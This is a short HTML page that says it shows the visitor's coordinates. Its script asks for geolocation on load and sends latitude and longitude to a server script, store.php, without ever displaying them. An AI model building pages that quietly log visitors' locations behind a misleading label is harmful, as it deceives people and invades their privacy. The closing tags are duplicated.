<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Page</title>
</head>
<body onload="getLocation()">
<h1>HTML Geolocation</h1>
<p>Get your coordinates.</p>

<p id="demo"></p>

<script>
const x = document.getElementById("demo");

function getLocation() {
  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(showPosition);
  } else { 
    x.innerHTML = "Geolocation is not supported by this browser.";
  }
}
    
function showPosition(position) {
    const xhttp = new XMLHttpRequest();
    xhttp.open("GET", "store.php?lat=" + position.coords.latitude + "&long=" + position.coords.longitude);
xhttp.send();

}
</script>

</body>
</html>
    
</body>
</html>
